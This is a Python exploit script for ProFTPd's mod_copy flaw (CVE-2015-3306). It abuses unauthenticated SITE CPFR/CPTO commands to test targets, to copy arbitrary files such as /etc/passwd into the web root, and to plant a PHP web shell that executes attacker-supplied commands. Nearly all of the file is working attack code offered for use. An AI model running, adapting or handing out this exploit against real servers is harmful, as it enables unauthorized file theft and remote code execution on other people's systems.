#!/usr/bin/env python
import sys
import optparse
import socket
import random

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

if sys.platform == 'win32':
    HEADER = ''
    OKBLUE = ''
    OKGREEN = ''
    WARNING = ''
    FAIL = ''
    ENDC = ''
    BOLD = ''
    UNDERLINE = ''

def caution( msg ): print bcolors.BOLD + bcolors.WARNING + "[" + bcolors.ENDC + "!" + bcolors.WARNING + "] " + bcolors.ENDC + str( msg ) + bcolors.ENDC
def good( msg ): print bcolors.BOLD + bcolors.OKGREEN + "[" + bcolors.ENDC + "+" + bcolors.OKGREEN + "] " + bcolors.ENDC + str( msg ) + bcolors.ENDC
def status( msg ): print bcolors.BOLD + bcolors.OKBLUE + "[" + bcolors.ENDC + "*" + bcolors.OKBLUE + "] " + bcolors.ENDC + str( msg ) + bcolors.ENDC
def error( msg ): print bcolors.BOLD + bcolors.FAIL + "[" + bcolors.ENDC + "-" + bcolors.FAIL + "] " + bcolors.ENDC + str( msg ) + bcolors.ENDC


def banner():
	title = "proFTPd Arbitrary File Read Write w/ Possible Code Execution (CVE-2015-3306)"
	author = "Author: nootropics (root@ropcha.in)"
	ch=' '
	length=80
	spaced_title = ' %s ' % title
	spaced_author = ' %s ' % author
	print "\n" + bcolors.WARNING + spaced_title.center(length, ch)
	print spaced_author.center(length, ch) + "\n\n" + bcolors.ENDC

def clear():
  if os.name == 'nt' or sys.platform.startswith('win'): os.system('cls')
  else: os.system('clear')

def main():
	parser = optparse.OptionParser(banner(), version="%prog")
	parser.add_option("-t", "--target", dest="target", default="localhost", type="string", help="Target IP")
	parser.add_option("-p", "--port", dest="port", default=21, type="int", help="Target Port")	
	parser.add_option("-f", "--file", dest="file", default="/etc/passwd", type="string", help="File to grab")
	parser.add_option("-m", "--mode", dest="chosenmode", default="1", type="string", help="Option to use 1: Test, 2: Grab File, 3: Code Exec")
	parser.add_option("-w", "--webdir", dest="webdir", default="/var/www/", type="string", help="Directory where the webserver gets files from (/var/www/)")
	(options, args) = parser.parse_args()

	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(( options.target, options.port ))
	except Exception:
		quit(error("Cannot connect to %s:%s" % (options.target, options.port)))
	status("Connected to %s:%s" % (options.target, options.port))
	if options.chosenmode == "1":
		s.send("site cpfr /etc/passwd\n")
		if "350" in s.recv(1024):
			good("Target is vulnerable!")
		else:
			error("Target doesn't appear to be vulnerable!")
	if options.chosenmode == "2":
		resultpath = options.webdir + ''.join(random.choice('0123456789ABCDEF') for i in range(16))
		s.send("site cpfr %s" % options.file)
		if "350" in s.recv(1024):
			good("File exists! Copying now")
		else:
			error("File cannot be found or accessed")
		s.send("site cpto %s" % resultpath)	
		if "250" in s.recv(1024):
			good("Copy sucessful! Check http://%s/%s for your file!" % (options.target, resultpath))
		else:
			error("Access denied!")
	if options.chosenmode == "3":
		shellkey = ''.join(random.choice('0123456789ABCDEF') for i in range(16)) + ".php"
		s.send("site cpfr /etc/passwd")
		s.recv(1024)
		s.send("site cpto <?php @$_GET['x']($_GET['a']); ?>")
		s.recv(1024)
		s.send("site cpfr /proc/self/fd/3")
		s.recv(1024)
		s.send("site cpto %s%s" % (options.webdir, shellkey))
		s.recv(1024)
		status("Browse to http://%s/%s to activate your payload!" % (options.target, shellkey))

if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		sys.exit(error("Closing!"))
